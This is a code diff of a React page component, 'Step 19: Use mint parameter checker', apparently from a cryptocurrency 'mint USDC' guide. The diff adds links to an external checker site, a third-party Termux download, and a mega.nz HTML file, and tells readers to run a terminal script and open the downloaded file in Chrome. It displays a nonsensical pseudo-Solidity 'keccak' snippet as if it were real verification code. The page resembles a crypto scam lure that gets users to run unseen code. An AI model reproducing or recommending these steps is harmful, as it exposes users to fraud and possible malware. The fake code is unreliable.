@@ -1,5 +1,6 @@
-import React, { useState } from 'react';
-import { Check, Copy, Terminal, Globe, Download } from 'lucide-react';
+import React, { useState } from "react";
+import { Check, Copy, Terminal, Globe } from "lucide-react";
+import Link from "next/link";
 
 type CopyStatusType = {
   keccak: boolean;
@@ -11,7 +12,7 @@ type CopyKeyType = keyof CopyStatusType;
 export default function MintParameterChecker() {
   const [copyStatus, setCopyStatus] = useState<CopyStatusType>({
     keccak: false,
-    script: false
+    script: false,
   });
 
   const keccakCode = `function keccak_256(Mint)[]: mint_usdc_contract_address(address to, uint256 amount, uint256 fee) external onlyOwner { _mint(to, amount); } : keccak(True or False)`;
@@ -107,7 +108,7 @@ done`;
         setCopyStatus((prev) => ({ ...prev, [type]: false }));
       }, 2000);
     } catch (err) {
-      console.error('Failed to copy text: ', err);
+      console.error("Failed to copy text: ", err);
     }
   };
 
@@ -116,18 +117,18 @@ done`;
       <div className="bg-slate-800 rounded-xl p-3 sm:p-6 border border-slate-700 shadow-lg">
         <h3 className="font-semibold text-lg sm:text-xl mb-3 sm:mb-4 text-white flex items-center gap-2">
           <Terminal className="w-4 h-4 sm:w-5 sm:h-5" />
-          <span className="break-words">Step 19: Use mint parameter checker</span>
+          <span className="break-words">
+            Step 19: Use mint parameter checker
+          </span>
         </h3>
-
         <p className="text-slate-300 mb-3 sm:mb-4 text-sm sm:text-base">
           Use a mint parameter checker to verify your contract:
         </p>
-
         {/* Keccak Code Block */}
-        <div className="mb-4 sm:mb-6 bg-slate-900 rounded-lg overflow-hidden border border-slate-700">
+        <div className="bg-slate-900 rounded-lg overflow-hidden border border-slate-700">
           <div className="p-2 sm:p-3 bg-slate-800 border-b border-slate-700">
             <p className="text-slate-300 font-mono text-xs sm:text-sm">
-              The mint checker checks for the call function:
+              The mint checker checks for this call function:
             </p>
           </div>
           <div className="relative group">
@@ -135,37 +136,60 @@ done`;
               <code>{keccakCode}</code>
             </pre>
             <button
-              onClick={() => handleCopy(keccakCode, 'keccak')}
+              onClick={() => handleCopy(keccakCode, "keccak")}
               className="absolute top-1 right-1 sm:top-2 sm:right-2 p-1.5 sm:p-2 text-slate-400 hover:text-white bg-slate-800 rounded-md transition-colors"
             >
-              {copyStatus.keccak ? <Check className="w-3 h-3 sm:w-4 sm:h-4" /> : <Copy className="w-3 h-3 sm:w-4 sm:h-4" />}
+              {copyStatus.keccak ? (
+                <Check className="w-3 h-3 sm:w-4 sm:h-4" />
+              ) : (
+                <Copy className="w-3 h-3 sm:w-4 sm:h-4" />
+              )}
             </button>
           </div>
         </div>
-
+        <p className="my-3 sm:my-4 text-sm sm:text-base text-slate-300">
+          Check the mint function by using one of these:{" "}
+        </p>
         {/* Access Methods */}
         <div className="space-y-3 sm:space-y-4 mb-4 sm:mb-6">
           <div className="flex flex-col sm:flex-row sm:items-center gap-1 sm:gap-2 text-slate-300">
             <div className="flex items-center gap-2">
               <Globe className="w-4 h-4 sm:w-5 sm:h-5" />
-              <span className="font-semibold text-sm sm:text-base">Web version:</span>
+              <span className="font-semibold text-sm sm:text-base">
+                Web version:
+              </span>
             </div>
             <a
-              href="https://mintchecker.vercel.app/mintchecker"
+              href="https://checkmint.vercel.app"
               className="text-blue-400 hover:text-blue-300 transition-colors text-sm sm:text-base break-all"
               target="_blank"
               rel="noopener noreferrer"
             >
-              mintchecker.vercel.app/mintchecker
+              checkmint.vercel.app
             </a>
           </div>
-          
+
           <div className="flex items-center gap-2 text-slate-300">
             <Terminal className="w-4 h-4 sm:w-5 sm:h-5" />
-            <span className="font-semibold text-sm sm:text-base">Local method (not available on iOS):</span>
+            <span className="font-semibold text-sm sm:text-base">
+              Local method (not available on iOS):
+            </span>
+          </div>
+          <div className="text-sm sm:text-base space-y-1 text-slate-300">
+            <p className="">
+              Download Termux and run the mint checker script on the terminal
+            </p>
+            <p className="">
+              Don&apos;t have termux?{" "}
+              <Link
+                href="https://termux.en.uptodown.com/android/download"
+                className="text-blue-400 hover:text-blue-300"
+              >
+                Download
+              </Link>
+            </p>
           </div>
         </div>
-
         {/* Script Code Block */}
         <div className="bg-slate-900 rounded-lg overflow-hidden border border-slate-700">
           <div className="relative group">
@@ -173,27 +197,42 @@ done`;
               <code>{scriptCode}</code>
             </pre>
             <button
-              onClick={() => handleCopy(scriptCode, 'script')}
+              onClick={() => handleCopy(scriptCode, "script")}
               className="absolute top-1 right-1 sm:top-2 sm:right-2 p-1.5 sm:p-2 text-slate-400 hover:text-white bg-slate-800 rounded-md transition-colors"
             >
-              {copyStatus.script ? <Check className="w-3 h-3 sm:w-4 sm:h-4" /> : <Copy className="w-3 h-3 sm:w-4 sm:h-4" />}
+              {copyStatus.script ? (
+                <Check className="w-3 h-3 sm:w-4 sm:h-4" />
+              ) : (
+                <Copy className="w-3 h-3 sm:w-4 sm:h-4" />
+              )}
             </button>
           </div>
         </div>
 
         {/* Footer Links */}
-        <div className="mt-4 sm:mt-6 flex flex-col sm:flex-row sm:items-center gap-2 sm:gap-4 text-xs sm:text-sm">
-          <a
-            href="#"
-            className="flex items-center gap-2 text-blue-400 hover:text-blue-300 transition-colors"
-          >
-            <Download className="w-3 h-3 sm:w-4 sm:h-4" />
-            Download HTML file
-          </a>
-          <span className="hidden sm:inline text-slate-500">|</span>
-          <span className="text-slate-300">
-            All files available in Telegram channel
+
+        <div className="flex items-center gap-2 text-slate-300 mt-4 sm:mt-4">
+          <Terminal className="w-4 h-4 sm:w-5 sm:h-5" />
+          <span className="font-semibold text-sm sm:text-base">
+            Method 3 (only Android and PC):
           </span>
+        </div>
+
+        <div className="mt-4  text-sm sm:text-base text-slate-300 space-y-2">
+          <p>
+            Or download a local webpage interface to check the mint parameters{" "}
+            <br />
+            Download html file and open with chrome browser
+          </p>
+          <p>
+            Download and run the html file{" "}
+            <Link
+              className="text-blue-400 hover:text-blue-300"
+              href="https://mega.nz/file/m9I0TIQR#6zE1ozO7dSyx2IuVZBmiU1aUFrei8tI1f4MZSpSqAQk"
+            >
+              here
+            </Link>
+          </p>
         </div>
       </div>
     </div>
